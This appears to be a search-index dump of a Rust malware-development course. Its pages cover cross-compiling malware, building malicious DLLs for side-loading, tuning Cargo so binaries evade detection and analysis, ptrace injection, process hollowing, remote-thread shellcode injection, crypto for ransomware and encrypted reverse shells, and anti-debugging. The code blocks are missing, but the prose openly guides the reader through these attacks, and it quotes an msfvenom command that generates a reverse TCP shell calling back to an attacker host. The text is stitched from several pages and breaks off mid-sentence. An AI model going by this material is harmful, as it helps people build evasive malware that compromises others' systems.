executable specific to the platform on which we are working. However, in many scenarios, it is necessary to deploy the application on embedded systems, remote servers or devices with different architectures or operating systems. This is where cross-compilation comes in.\nCross-compilation is a technique that allows code to be compiled for a different system, providing the flexibility for developers to create applications for a variety of hardware architectures without the need for a dedicated development environment for each target.\nBy using cross-compilation in Rust, we as malware developers can compile our source code on a development machine, which is generally more powerful, and then generate an executable that is compatible with all our targets, including Linux and Windows for the purposes of this course. This greatly increases our attack surface.\nIn this part of the course on cross-compilation in Rust, we will explore the basic concepts, the tools available and the best practices for taking full advantage of this approach in the development of cross-platform malware.\nTo do this, we'll start with this simple :\n\nSource :\n\nSelect toolchain🔗\nAs indicated in the Cargo optimisation course, the toolchain is the chain of tools used to compile our program in Rust.\nRustup, the toolchain management tool, allows us to install toolchains for other platforms, such as Windows:\n\nHowever, this requires you to install the ‘MinGW’ compiler for Windows beforehand, which can be a little complicated on Linux depending on your distribution.\nThen compile our program by telling Cargo to use this toolchain in the :\n\nAnd that's it, we've successfully compiled our program for Windows, and the executable can be found here:\n\nTo test it, we can, for example, run it with the Wine emulator.\nUsage of \"cross\"🔗\nTo avoid having to install Windows compilation dependencies on our machine, there is a ‘cross’ tool to simplify the cross-platform compilation phase. It relies on a system of Docker or Podman containers to embed all the necessary dependencies for each toolchain.\nTo install it, you can use the Cargo manager or your distribution's packager, if available:\n\nThen simply re-execute the command to compile our program, replacing ‘cargo’ with ‘cross’ :\n\nIt will download the image linked to the specified platform, then compile your program. If you need to test your program with ‘cross run’, it will run it directly with Wine within the container.\nOptimise code for cross-compilation🔗\nIt goes without saying that the precompiler knows which platform it is compiling for, which is why we are going to make use of the ‘cfg!’ macro to optimise our code for cross-compilation.\nWe're going to modify the source code of our project to display a string of characters depending on the platform on which it's being run:\n\nYou can see straight away that in this version, we are obliged to change the contents of the ‘platform’ variable if we want to compile the program for Windows. Here is the corrected version using the ‘cfg!’ macro :\n\nAnd that's it, our code is now cross-platform. But it can also be optimised more efficiently by using the global macro ‘#[cfg()]’ with this example:\n\nNow we're going to demonstrate the use of the global macro ‘#[cfg()]’ on a slightly more complex structure to simulate the architecture of a real project:\n\n\n\n\n\nWith this structure, we can correctly separate our cross-platform code, with the ‘print_hello’ function common to each platform.\nWe invite you to read the official reference on conditional compilation in Rust for a full list of possibilities:\nhttps://doc.rust-lang.org/reference/conditional-compilation.html\nOptimise dependencies🔗\nIf we use the same project to produce our malware on Linux and Windows, it is normal for certain dependencies to apply only to the platform in question.\nTo separate the dependencies between platforms correctly, Cargo provides us with the ‘cfg’ macro in the configuration of the ‘Cargo.toml’ file:\n\nIn this example, ‘anyhow’ is compiled for all platforms, ‘windows’ for the ‘Windows’ platform and ‘libc’ for the Linux platform.\nConclusion🔗\nYou now have everything you need to start developing malware that will run on more platforms.\n","id":"http://127.0.0.1:1111/cargo/cross-compilation/","title":"Cross-compilation"},"http://127.0.0.1:1111/cargo/dynamic-library/":{"body":"Dynamic libraries, also known as ‘Shared Objects’ on Linux or ‘DLLs’ (Dynamic Link Libraries) on Windows, provide a powerful mechanism for the organisation, reuse and interoperability of software development.\nUnlike static libraries, which are linked at compile time, dynamic libraries are loaded at run time.\nIn the context of offensive security, dynamic libraries are often abused to exploit a system.\nIn this part of the course, we will learn how to compile dynamic libraries in Rust, focusing on the production of malicious libraries to usurp legitimate libraries, for example.\nThis involves understanding how to expose Rust functions so that they can be used by other languages, which is known as interoperability.\nWe'll start with the following project, which exposes a simple function that displays a string of characters:\n\nSource :\n\nWhen compiled, the result is as follows:\n\nWe can see that the compiler simply generates a sort of archive, which is normally used afterwards to link it statically to the program that uses the library in question.\nThis is not a dynamic library, so we need to add the following section to our ‘Cargo.toml’ file to tell Cargo to generate a dynamic library:\n\nThen when you recompile, you get a dynamic :\n\nNow, there's one more major concern, and that's the ABI.\nThe ABI is a set of rules and conventions that dictate how functions, data structures and system calls should be defined in binary format in machine code. A bit like an API, but for binaries.\nThe problem is that the ABI of the C language, the most commonly used, and that of the Rust language, are not the same. Reluctantly, we're going to have to adapt our project so that it uses the ABI of the most common language to increase our attack surface.\nFirstly, we need to tell Cargo to use the C :\n\nThen he also has to make changes to the source code:\n\nThe addition of the ‘#[no_mangle]’ is necessary to prevent the compiler from modifying the final name of the function.\nIn our example, there aren't many difficulties as there are no input arguments or return values, but if there were, we couldn't simply return Rust types, but C types.\nFortunately for us, they are available in the standard library in the ‘std::os::*’ path.\nNow we finally have a dynamic library that can be called by C programs. Note that the steps we've just produced also work on Windows.\nWe're now going to develop another binary to test our dynamic library, and at the same time show how to run dynamic libraries compiled with the C ABI, in our Rust program.\nHere is the source code:\n\n\nHere, we use the ‘libloading’ dependency, which loads our dynamic library from our current directory, then we import the function using its name ‘hello_library’ and finally we execute it.\nWe successfully observe the result at runtime:\n\nThis example works equally well on a Linux system.\nConclusion🔗\nWe now have all the tools we need to develop malware in the form of a dynamic library, which could be useful when we want to exploit attacks such as ‘Side-Loading DLL’ or ‘Phantom DLL’ or simply code injection in general.\n","id":"http://127.0.0.1:1111/cargo/dynamic-library/","title":"Dynamic library"},"http://127.0.0.1:1111/cargo/optimise/":{"body":"In this first part of the course, we will explain the techniques for maximising the efficiency of Cargo for malware design.\nOptimising Cargo involves configuring it to reduce the size of the final binary, as well as ensuring that the code generated contains no compromising indicators, thus guaranteeing that any signatures recognisable by security solutions are hidden.\nThis course will immerse you in Cargo's features, exploiting its compilation, dependency and configuration management capabilities to bypass traditional defences and avoid detection.\nTo do this, we will start with this simple project (download the code in the appendix):\n\n\nWe'll compile it with the default configuration and analyse the result:\n\nWhat ?? Our little \"hello world\" program produce a 4.2 Mo size binary ??\n\nUsing the strings utility, which will extract all the strings in plain text in a binary, we can also find compromising indicators such as our user name user0 and the name of the binary at compilation time.\nAnd if we start playing around with a debugger such as the gdb utility, we can even go back to the original source code :\n\nThe list command in gdb is used to rebuild the source code from the debugging symbols.\nOptimising Cargo for malware development🔗\nBy default, Rust optimises execution speed, compilation speed and ease of debugging rather than binary size, because for the vast majority of applications this is ideal.\nBut in the context of malware development, a malicious actor is desperate to reduce the size of its binaries for the following reasons:\n\nA heavier executable is obviously more suspect for security solutions, especially if it tries to imitate other legitimate programs that are lighter. We can think of the metaphor of a pipe through which we can pass our code with complete discretion.\nReducing the amount of debugging information in the binary makes malware analysis and detection more complex for security researchers.\n\nAnd Cargo provides us with several mechanisms to achieve this.\n1. Use the \"release\" compilation profile🔗\nProfiles allow you to change compiler settings and influence things like optimisations and debugging symbols.\nCargo has four built-in profiles: dev used by default, release, test and bench. The profile is automatically chosen according to the command being executed if no profile is specified on the command line. In addition to the built-in profiles, user-defined custom profiles can also be specified.\nThe release profile is used for optimised artefacts used for production, and removes some of the debugging symbols.\nTo apply this profile, simply compile with the --release option or just -r :\n\nWell, now our binary is optimised and there's no trace of my user name. We've also removed the possibility of reconstructing the source code just as easily :\n\nHowever, the size of the binary is still abnormally large and there are still traces, such as the name of the program at compile time :\n\n2. Optimising the \"release\" compilation profile🔗\nProfile parameters can be modified in Cargo.toml using the [profile] table. In each profile, individual parameters can be modified with key/value pairs such as these:\n\nopt-level :🔗\nThe \"opt-level\" key controls the level of optimisation. Higher levels of optimisation can result in faster code execution at the expense of longer compilation times. Higher levels can also modify and reorganise compiled code, which can make it more difficult to use with a debugger.\nPossible values are :\n\n0: no optimisation (used by the \"dev\" profile)\n1: basic optimisation\n2: some optimisations\n3: all optimisations (used by default by the \"release\" profile)\ns: optimised for binary size\nz: optimised for bit size and loop vectorisation disabled.\n\nFor our malware, we'll choose the value s to take advantage of the binary size optimisation without changing the default behaviour too much. You are invited to test different values depending on the libraries used, which may have an impact.\nstrip :🔗\nThe strip key controls the presence or absence of debugging symbols. Given that these are not necessary data for program execution and that the last thing we want is for someone to debug our malware, we're going to have the pleasure of removing them.\nCargo allows us to do this by setting the strip key to the value true.\nThis action can also be performed on Linux with the strip utility.\nLTO :🔗\n\"Link Time Optimization\" is a feature of LLVM, Rust's intermediate compiler, designed to optimise the work of the linker. Its aim is to rationalise the linking process by enabling in-depth optimisation, in particular by eliminating unused portions of code. As a result, the aim is to reduce the size of the final binary.\nCargo allows us to use this option by setting the lto key to true.\npanic :🔗\nThe panic key is used to control the behaviour of our program when it \"panics\" (can be called with the 'panic!' macro). In Rust, a panic occurs when the program encounters an error that is deemed irrecoverable.\nThe possible values are :\n\nunwind: default value, which instructs the program to unwind the stack to produce a useful trace for debugging. In our situation, we absolutely don't want our malware to leave any more information and this takes up space in our binary.\nabort: the program will terminate immediately. So it's more advantageous for us.\n\nCargo lets us control this option by setting the \"panic\" key to the \"abort\" value.\n\nLet's analyse the results of the many optimisations we have made to our Cargo.toml file:\n\n\nAs you can see from the screenshot above, the compilation did take a little longer, but the size of our binary was reduced from 4.2 Mo to just 284 Ko.\n\nNow we're going to add another test for our optimisation, we're going to modify the source code to force our program to panic:\n\nThen we'll run it again, this time without the optimisations:\n\nThen with our optimisations :\n\nThe benefits are clear to see, given that it no longer leaks sensitive information in relation to our malware's source code.\nHowever, there's one more annoying detail in this screenshot.\nThe program shows the code file where it panicked (\"src/main.rs\") as well as the position (line 3, column 5). At first glance, this may not seem very important, but in reality it could provide a serious clue to an analyst examining our malware, for example if our program panics in an external library.\n3. Using \"unstable\" compiler features🔗\nTo solve this problem, we need to explore more advanced settings that require the use of Rust compiler options that have been implemented but are not yet considered stable.\nWe will need to use the nightly toolchain, which is the compilation tool suite updated daily with the latest Rust :\n\nThis command will install the necessary toolchain.\nWe will then specify that our project uses this toolchain using the \"rust-toolchain.toml\" file that we will add:\n\nWith the following content:\n\nWe can now use \"unstable\" compiler features.\nlocation-detail :🔗\nThe unstable location-detail option, which is passed directly to the rustc compiler, is used to control the amount of factual detail, such as file, row and column, emitted when using the caller_location() function called when a Rust program panics.\nIn our situation, we absolutely do not want to deliberately divulge this type of information. So we're going to pass the compiler the location-detail=none argument. Normally passed to the like this :\n\nTo pass options to the compiler, we need to add a configuration to Cargo in a config.toml file, not to be confused with the Cargo.toml file which is used to specify dependencies, project details and project parameters, whereas config.toml is a configuration file which uses more advanced features and can be configured per project or globally.\n\nAnd finally added the contents of the :\n\nNow all we have to do is recompile :\n\nThe compromising information has now been removed.\nbuild-std :🔗\nRust provides a precompiled version of the standard library (std) with its toolchain. This means we don't need to recompile std every time we compile our malware. And remember that the standard library is statically linked to our binary, of course.\nAlthough this is very practical, for us malware developers there are several disadvantages:\n\nThe precompiled standard library is optimised for speed, but not for size.\nIt is not possible to remove the parts of the standard library that are not used in our malware (with LTO) and is not compiled with our previous optimisations.\n\nThis is where build-std comes in. The build-std functionality is capable of compiling the standard library with our malware from source. It does this using the rust-src component provided by rustup:\n\nYou can now control how the standard library is compiled by adding the following configuration:\n\nWhen using build-std it is also necessary to specify our compilation target.\nWe can now see a further reduction in the size of our binary :\n\npanic_immediate_abort :🔗\nEven though panic = \"abort\" specified in Cargo.toml is supposed to disable the code executed when a program panics, the Rust compiler will still include the panic strings and formatting code in the final binary by default. An unstable panic_immediate_abort feature has been built into the nightly compiler to solve this problem.\nTo use it, repeat the instructions above to use build-std, and also add the following configuration:\n\nThen look at the result:\n\nThe reduction is quite impressive, from 212 Ko to 28 Ko. At runtime, we can also see that it no longer displays anything when it panics, which is to our advantage in terms of malware development.\nConclusion🔗\nWe have now reached the last level of optimisation that we can use without having too much impact on the operation of our malware. There are still many other ways of reducing the size of our binary aggressively, but they have too great an impact on the way we program.\nFor example, we can completely separate ourselves from the standard Rust library (with the #[no_std] macro) and use only functions from the libc directly, which allows us to obtain binary sizes relatively close to those programmed in C.\nThe disadvantage is that we lose the use of all the external libraries that depend on the standard library, but there are plenty of others that don't, like most cryptographic libraries.\nNow that you have all the information you need to optimise Cargo for malware development, I would advise you not to apply all these optimisations at the start of your development phase. In fact, it is possible that some of the features you use may have an impact on the operation of the external libraries you use.\nThat's why we recommend that you only apply these options at the end of your development phase, and then deactivate those that could cause problems as you go along.\nThe final source code is provided as an appendix to this course.\n","id":"http://127.0.0.1:1111/cargo/optimise/","title":"Optimise Cargo"},"http://127.0.0.1:1111/code_injection/":{"body":"","id":"http://127.0.0.1:1111/code_injection/","title":"Code injection"},"http://127.0.0.1:1111/code_injection/injection-with-ptrace/":{"body":"In this section, we'll look at how the ptrace system call on Linux can be used to inject code into a running process to make it execute the code you want.\nThe ptrace system call allows you to attach yourself to a process and control its execution, modify its memory space and consult its registers. It is used by debuggers such as GDB. Attaching to a process with this system call is called tracing.\nHere, we're going to modify the RIP register and replace the process instructions with our own.\nThe target process is the following program, i.e. it is possible to attack any process as long as permissions allow.\nThis is our target program, my_process.c:\n\n\nTo use the ptrace call, we'll use the Nix library with the ptrace feature.\n\nOur Cargo.toml file contains the following dependencies:\n\nThe Nix crate provides the various parameters available in ptrace in separate functions available in the nix::sys::ptrace module.\nNote that all these functions take as their first parameter the PID of the process on which the action is to be performed, and the call to the attach function must have already been called on the target process.\nHere's our instruction injection program:\n\nThis program works as follows:\n\nRetrieve the PID of the target process by searching all folders in /proc/ where the name is a PID and the process invocation command is the name of the process you are looking for, which must be attachable with ptrace.\nWait for the process to be attached by waiting for it to be stopped with waitpid, the SIGSTOP signal indicating that the process is attached.\nGet the process registers with getregs, then get RIP in a variable, adding 2 to RIP so that our instructions are executed directly after we detach from the process.\nWe write our instructions to the location pointed to by RIP.\nWe detach from the process so that it can resume its course of execution.\n\nIn this example, we're going to execute instructions to display \"hello world\", here's its hexdump:\n\nWhen we run our program on the \"my_process\" process, we can see that the string \"hello world\" is displayed:\n\n\n","id":"http://127.0.0.1:1111/code_injection/injection-with-ptrace/","title":"Injection with PTRACE"},"http://127.0.0.1:1111/code_injection/process-hollowing/":{"body":"This technique involves creating a process, putting it in a suspended state, and replacing the code at the process entry point with shellcode.

To help you understand, here is a diagram:\n\nWindows Program🔗\nTo develop this program, we once again rely on the Windows API with the associated documentation we have already covered in previous sections. After creating a new project with cargo new, you can populate your Cargo.toml with these dependencies:\n\nanyhow = 1.0.79\ncolored = 2.1.0\nwindows = {version = \"0.52.0\", features = [\"Wdk_System_Threading\", \"Win32_Foundation\", \"Win32_Security\", \"Win32_System_Diagnostics_Debug\", \"Win32_System_Kernel\", \"Win32_System_Threading\"]}\n\nIn your main.rs, you can declare the crates as follows:\n\nSummary of Actions Performed by Our Program:\n\nCreate a process with CreateProcessA, which can be a cmd, notepad, or anything else. Its state will be set to \"suspended\" while we make our modifications.\nCreate a handle on this process and retrieve information, with NtQueryInformationProcess, such as the base address of the Process Environment Block (PEB). This element contains information like data structures, process startup parameters, and the base address of the program image.\nRead the process memory with ReadProcessMemory, verify the conformity of our executable via its magic bytes (MZ in our case), and retrieve data such as header addresses and the entry point (actual starting address of program execution).\nModify the data in the process memory via WriteProcessMemory with our shellcode.\nContinue program execution after modification via ResumeThread.\n\nWithin the code, we also add the shellcode, check for errors at each key point using the anyhow crate, include sleeps to allow time to see the execution of each part one after another, and return an Ok(()) to indicate that the program executed successfully. Prints of each execution part have been added for the lesson, but they can obviously be removed.\nCode Details🔗\nOur shellcode will be contained in the variable 'shellcode' as a byte array. A variable to hold program information will be declared as type PROCESS_INFORMATION. Finally, the created suspended process will be indicated as a pointer. An \"unsafe\" block will be necessary to use most Windows API functions, including our CreateProcessA:\n\nWe then define a handle on our process, a structure to store its information PROCESS_BASIC_INFORMATION, and query the process:\n\nWe retrieve the image address (the program's entry point), create a buffer to store it, and call ReadProcessMemory:\n\nA second ReadProcessMemory is called to retrieve the DOS headers to verify our program's integrity:\n\nThe final step follows, we retrieve the program header address and its entry point, then write our shellcode into memory with WriteProcessMemory and resume execution:\n\nOnce the code is compiled with cross, we can execute it, as shown in the following image, where the user kev_user has been successfully added to the local users of the machine:\n\nYou can find the full code in the next section.\nLinux Program🔗\nRegarding the Linux program, it is much simpler. The following crates should be imported into your Cargo.toml:\n\ncolored = 2.1.0\nnix = { version = \"0.27.1\", features = [\"ptrace\"] }\n\nIn the main.rs, you can declare the following dependencies:\n\nFirst, we declare our shellcode with the variable let shellcode: [u8; X] where X represents the number of bytes in the shellcode. We used the following command to generate our shellcode: msfvenom -p linux/x64/shell_reverse_tcp -f rust LHOST=192.168.1.10 LPORT=4444, which is a simple reverse TCP shell.\nOur program will consist of a large block of code composed of a match unsafe { fork() }. This function is responsible for creating a child process by duplicating the parent process. We then use this process creation via a ForkResult which will contain information about the child and parent processes if the fork() was successful.\nThe child process must be set as \"traceable\" to make the necessary modifications for shellcode injection. An executable is then defined (/usr/bin/bash in our case) and will replace our current process via an execve(). We then focus on the parent process, pausing the child process via waitpid() and retrieving its RIP register. This is where the shellcode will be injected. We then resume the execution of the child process via detach(). Sleeps have been integrated to allow easier observation of the attack progression. After execution, we successfully get a shell on the remote machine:\n\nThe corresponding code is available in the next section.\n","id":"http://127.0.0.1:1111/code_injection/process-hollowing/","title":"Process Hollowing"},"http://127.0.0.1:1111/code_injection/remote-threads/":{"body":"This section is dedicated to the implementation of shellcode injection within a program where we will allocate the necessary memory space to contain this shellcode.

The documentation for OpenProcess is available for the crate and the Windows API. Here is its definition:\n\nWe pass parameters such as the desired access to the process, its handle, and the PID. Once this handle is retrieved, we will allocate memory within it via VirtualAllocEx:\n\n\nIn this function, we pass the process handle, None to let the function allocate the memory address itself, dwSize references the size of our shellcode, the allocation type is set to MEM_COMMIT | MEM_RESERVE, and we request the ability to read, write, and execute on this address range.

This implementation is noteworthy because it operates without any dependencies, and its creators claim it is three times faster than the RustCrypto implementation. However, this crate has not been subjected to code control tests implemented by external companies.\nThe AES mode we will use is GCM (Galois/Counter Mode). This mode is used for its performance and works on block cipher algorithms like AES. This mode allows us to guarantee both the integrity and confidentiality of the data we will process. It is part of the encryption class known as AEAD: Authenticated Encryption with Associated Data.\nIn this section, we will implement AES on a string to encrypt it with a cipher and a nonce, then we will address a file.\nImplementation of AES on a String🔗\nAs usual since the beginning of this chapter, we refer to the documentation to find information about the methods and Traits we will use: documentation-AES.

This key, held by both parties, will be exchanged with each other. Once in possession of this key, each will again perform a calculation by adding their secret. These different steps ultimately allow both parties to have exactly the same key, but their respective secret never appears in the public exchanges, making it impossible for someone intercepting their communication to find the value of this secret key.

Subsequently, the public key of each will be sent to the other to create the shared key. Here is the corresponding code:\n\nThe EphemeralSecret structure calls the \"random_from_rng\" method, which takes a random number provided by OsRng as a parameter. This first secret is then passed as a parameter to the PublicKey structure within the \"from\" method to give us a public key. This key is then assumed to be transferred between the two parties. Each will subsequently use the other's public key as a parameter of the diffie_hellman method applied to their respective secret. Two shared keys result from this process. After running the program, no errors are detected, indicating that our final instruction: assert_eq! is valid and that the two keys are identical.\n\nThe two shared keys held by our two parties are now usable to encrypt their future communications. The corresponding code is available in the next section.\n","id":"http://127.0.0.1:1111/crypto/df/","title":"Diffie-Hellman"},"http://127.0.0.1:1111/crypto/intro/":{"body":"In this section, we'll look at the practical aspects of cryptography, focusing on key elements such as symmetric, asymmetric and Diffie-Hellman encryption, hash functions and ending with SSL/TLS sockets. We won't go into detail about how these elements work, as cryptography itself would take up an entire course. Nevertheless, there will be a theoretical section followed by practical implementations.\nImplementing cryptographic functions or hashes within our malware will be useful, in particular to avoid transmitting our data streams in clear text in the case of reverse shell or when developing the practical case on ransomware.\nWe have selected RustCrypto as the source of crates for this course, as this project is used and maintained by a large number of users. What's more, its updates are audited by external parties to ensure that the implementations are free of security flaws. The openssl crate will be used for sockets.\nUsing RustCrypto🔗\nThe GitHub directory available here : RustCrypto contains a set of crates relating to cryptography. In particular, we'll be using :\n\nRSA for asymmetric encryption\nSHA-2 for the hash function\nAES-GCM for symmetric encryption\nx25519_dalek for Diffie-Hellman\n\nTo import the crates into your projects, simply select the one you want from those available on the RustCrypto GitHub, then access its crates.io link:\n\nOn this platform, you'll find information about the crate, such as the last update, file size, implementation examples, dependencies and available versions. In this example, we'll be using RSA. To import it into your project, simply add the following line to our Cargo.toml dependency file, which is present once the project has been created via cargo new :\n\nThe procedure will be the same for the other crates discussed in this chapter, except for x25519_dalek, which will be available via another GitHub directory: 25519-dalek. We advise you to read the documentation for the crates we'll be using, as you'll find the answers to your questions much more easily than by searching the Internet. The answers will also be of higher quality, enabling you to really understand how the functions, methods, traits or data used work.\n","id":"http://127.0.0.1:1111/crypto/intro/","title":"Introduction"},"http://127.0.0.1:1111/crypto/rsa/":{"body":"RSA is known to be used by default when generating SSH keys with the ssh-keygen utility available on most Linux distributions. It can be represented as follows:\n\nWe're going to reproduce a similar key generation and then encrypt and decrypt a message in an example of Rust code. We recommend that you create a new project for the practical part that follows via cargo new.\nTwo dependencies are required and must be added to your cargo.toml file. These are the most recent versions at the time of writing:\n\nrsa = 0.9.3\nrand = 0.8.5\n\nWithin your main.rs file, we import the structures and methods required for RSA key generation:\n\nWe'll then use the documentation to create our private and public keys. These two objects are structures defined in the rsa crates and are available here: private and public. As indicated, we need a random number rng: &amp;mut R to be created with rand and a key size bit_size, set to 2048, to use the new() method. As error handling is not the priority here, we'll simply handle them with an expect(). The code will be as follows:\n\nThe public key is generated by passing a reference to the previously created private key. We then have several possibilities for using our key pair. We'll look at two use cases in the next few lines: encrypting and decrypting a string, and recovering our public and private keys.\nThe string we're going to use is the following:\n\nWithin our RsaPublicKey structure, an implementation has been made to enable us to encrypt a message: the \"encrypt\" function. The public key is used to encrypt the data, while the private key is used to decrypt it.\n\nThis function takes as parameters a random number (in the same way as our key generation), a padding and the message we wish to encrypt in the form of an array of u8 data (corresponding to the ASCII value of our letters within the message). A simple check is added, the \"assert_ne\", to verify that the value of our encrypted message is indeed different from our base message. The code to be added is as follows:\n\nThe final data we recover is \"data_encrypted\", which is a u8 vector containing our encrypted message. To decrypt our message, we can look at the documentation associated with our private key. Within the implementations, the \"decrypt\" function is proposed. It takes as parameters a padding (in the same way as \"encrypt\") and the message to be decrypted. It will return a vector of u8, which will be exactly identical to our u8 array in the \"data\" variable at the beginning.\n\nThe result can then be displayed in ASCII using a loop:\n\n\nIf you simply wish to display or save your public or private key, new imports are required: pkcs1::{EncodeRsaPrivateKey, EncodeRsaPublicKey, LineEnding} which are included in the rsa crate. The final import block will therefore be :\n\nWe chose pkcs1 because it supports a classic format for encoding RSA keys in binary (DER) or textual (PEM) form. In our example, pkcs8 could also have been used, as this is the mode most often used today. To differentiate between them, we can look at the value of the first line once our key has been exported to a file.\nFor pkcs1, we'll have :\n-----BEGIN RSA PRIVATE KEY-----\nand for pkcs8 :\n-----BEGIN PRIVATE KEY-----.\nA search on the Internet for a way to export RSA keys in Rust yielded initial results indicating the use of the \"export-rsa\" crate:\n\nWe advise you to check the crates.io links before using a crate because, as in this case, the crate is deprecated and an indication is given as to which crate has been replaced.\n\nThis is just an example, but it could apply to your next crate search and use. Having taken this wrong road ourselves at the outset, we returned to the native implementation via the rsa crate, where the key export information was already present before our internet search.\nReturning to our exports, two Traits will be used: EncodeRsaPublicKey and EncodeRsaPrivateKey both to display the keys and to save them in a file. Within these Traits, we'll use the to_pkcs1_pem method, which takes as parameter a reference to our key and one of the LineEnding enumeration values. We've chosen \"LF\", which corresponds to a simple line feed (on Unix systems) \\n. The final data will be a String if there was no error:\n\nThis will correctly display the public and private key at runtime.\n\nThe last point in this chapter is to save our keys in PEM format. Instead of using the to_pkcs1_pem method, write_pkcs1_pem_file will be used. The arguments are the same as above, but one must be added: the path where the file will be written, corresponding to path_pub and path_priv in our code and pointing to the project folder. Don't forget to modify this data when you implement it.\n\nAfter execution, we can see the files in our project via an ls -lah :\n\nAnd a \"file\" confirms that the system has recognized our key:\n\nIt's now possible to use your public and private keys to exchange information via ssh, for example. This first chapter on cryptography with RSA is now complete, and you'll find the full code in the section just below.\n","id":"http://127.0.0.1:1111/crypto/rsa/","title":"Asymmetric encryption"},"http://127.0.0.1:1111/crypto/sha256/":{"body":"After implementing RSA in the previous section, we will use the sha-256 implementation with Rust via the crate we mentioned in the introduction: sha2. This part can be useful for verifying the integrity of data such as files or strings, as well as generating passwords as examples. According to the crate documentation, six standard algorithms are available with sha2; here we will use sha-256.\nTo practice the concepts related to sha-256, we recommend creating a new project via cargo new.\nImplementation of sha-256 on a String🔗\nOur first example concerns applying the hash function on a simple string. To do this, you will need to integrate the relevant crates into your Cargo.toml:\n\nhex = 0.4.3\nsha2 = 0.10.8\nhex-literal = 0.4.1\n\nNext, as you probably expect, we will define a String (the one to be hashed) and a \"hasher\" (the object used to hash our String). For this \"hasher\", we create it via the Digest trait and its new() method. This new() method simply returns a Self: creating a new instance of \"hasher\". We will insert values into this \"hasher\" via the update method, which can be called multiple times, and then we will finalize its creation via the finalize method. The \"hex\" crate will be used to convert our result into a hexadecimal value, and hex_literal will help us compare our \"hasher\" object with a hex value calculated by another means. Here is the code snippet related to this first part:\n\n\nIf you want to ensure that your hash value is correct, you can use a site like xorbin to calculate it. To ensure the equivalence between our code and the calculated value later, we implement another piece of code.\n\nIf the compilation and execution run without errors, it means the hash calculated by your function is correct! Now, we will implement sha-256 on a file.\nImplementation of sha-256 on a File🔗\nThe methodology is similar for creating the hasher; we just need to handle opening the target file and reading its content, which can be subject to potential errors (such as file not found or read/write permissions). In our example, we create a file hello.txt at the project level containing the string hello world. The data written in this file being the same as our initial String, the result of our two hash calculations should be identical in this case. Once again, error handling is not our priority here, so we will handle them with simple expect(). Here is the new code to implement:\n\nIf you want to compare the return values of your hashes, you can use the assert_eq! macro in the same way as previously by including the hash calculated on the string and the newly calculated hash on our file. After execution, we can see that our two hashes are indeed identical as shown in the following figure:\n\nImplementation of sha-256 for Password Hashing🔗\nThe last point we will cover is creating a hashed password with sha-256. This method is for demonstration purposes only; other specific crates are recommended for creating hashed passwords such as sha_crypt.\nYou won't be surprised that in this part we will use the \"hasher\" system again. A function will be created where we will take as parameters the password, a salt (a value added to the base password so that two identical passwords do not return the same value with a different salt), and the value that will contain the output of our function. The type returned by this function will be a Digest (translated in French as an \"envelope\", a wrapper linked to cryptographic functions that has a fixed size). The corresponding code is as follows.\n\nIn our function, we encode the password passed as a parameter and the salt with as_bytes to convert the characters into bytes and add the character $ to delimit the password from the salt. We copy the result of our hasher.finalize() into the output variable, a value returned by the function. This value will be contained in an array of 32 u8 in our main() function within buf1. After execution, our hashed and salted password appears.\n\nWe have now finished this section on the implementation of sha-256. You will find the source code available in the next section.\n","id":"http://127.0.0.1:1111/crypto/sha256/","title":"Hashing"},"http://127.0.0.1:1111/crypto/sockets/":{"body":"The SSL/TLS protocol suite is particularly known for being used within web browsers during HTTPS exchanges. They operate in client-server mode and add a layer of security during exchanges by authenticating the server and ensuring data confidentiality. We will base this on the openssl crate and create two programs, a server, and a client. In our case, we use the crate's automatic detection to use openssl; you can refer to the \"Automatic\" section of the documentation for necessary installations. After creating a new project, you can add the crates we will use via: cargo add anyhow and cargo add openssl.\nCreating the Server🔗\nWe will start by implementing the server; the crates to import into our main.rs file are as follows:\n\nWe use the SslAcceptor structure to create the \"wrapper\" that will contain the server-side data streams and use the default builder, which is mozilla_intermediate. This builder takes as a parameter the ssl method we want to use: tls_server(). Within this \"builder,\" we will also specify the private key and certificate used to encrypt the streams. These two elements can be generated via the following command:\n\nIn the command, x509 is one of the standard formats for certificates, 4096 is the key size, server.key and server.pem are our output files, and 365 corresponds to the validity period of our certificate.\nSubsequently, this \"builder\" will be converted into Arc&lt;SslAcceptor&gt;, which will allow creating references with the same \"ownership\" over the object. Finally, we will define a \"listener\" responsible for listening for incoming connections. The corresponding code so far is as follows:\n\nWith the \"listener\" ready to accept connections, we now need to manage them. A loop will be used to retrieve each incoming connection and create a new \"thread\" used by the handle_client() function. If an error occurs, it will be caught by the \"match\" and returned. The Ok(()) at the end is used via anyhow to indicate that the execution went smoothly.\n\nThe remaining block to implement is the client handling function. This function will take a TCP data stream as a parameter and loop between a user request, writing this data into a \"buffer\", sending it, and receiving an acknowledgment message from the client. The input data will be formed of 1024-byte blocks. We use from_utf8_lossy because this function allows us to use our byte array directly, unlike the from_utf8 function which requires a vector.\n\nCreating the Client🔗\nThe crates we need to import into our main are as follows:\n\nIn our client program, we will use an SslConnectorBuilder instead of an SslAcceptorBuilder. This structure also takes an Ssl method parameter that we set to tls_client(). We then set the SSL verification mode to NONE to prevent our server program from requesting a client certificate and for the client not to worry about the server certificate's validity. Using the previous builder, we create an SslConnector and a TcpStream on our local IP address and the same port as the server 8080. A loop is then defined to wait for a message from the server using a buffer of the same size as the server: 1024 bytes. Just like with the server, the ssl_read and ssl_write functions will be used for data reception and sending. A delimiter of the received data is necessary using the symbol \\n so that our buffer only displays the sent message and not the zeros that compose it if the message is less than 1024 bytes. After reception, we send a value back to the server to indicate that the data was received correctly. The complete code is as follows:\n\nTo conclude, here are the terminal snapshots of the client and server after execution.\n\n\nThis chapter on cryptography is now complete. We are certain that the implementation of the various encryption algorithms presented will serve as a foundation for the ransomware development exercise.\n","id":"http://127.0.0.1:1111/crypto/sockets/","title":"Sockets with OpenSSL"},"http://127.0.0.1:1111/evasion/":{"body":"","id":"http://127.0.0.1:1111/evasion/","title":"Evasion"},"http://127.0.0.1:1111/evasion/anti-debug-with-isdebuggerpresent/":{"body":"Detecting a debugger attached to our process is very simple on Windows.\nThe Windows API contains a function called IsDebuggerPresent, which, as its name suggests, allows you to find out whether a debugger is present by returning a boolean.\nTo use it in our program, we need to use the windows-sys crate with the Win32_Foundation and Win32_System_Diagnostics_Debug features:\n\nIts use is very simple, as the following code demonstrates (note that this function must be called in an unsafe block):\n\nWhen we run our program without using a debugger, we can see that the string \"No debugger attached.\" is displayed:\n\nHowever, if you run it with WinDBG attached, you can see that the string \"Debugger attached!\" is 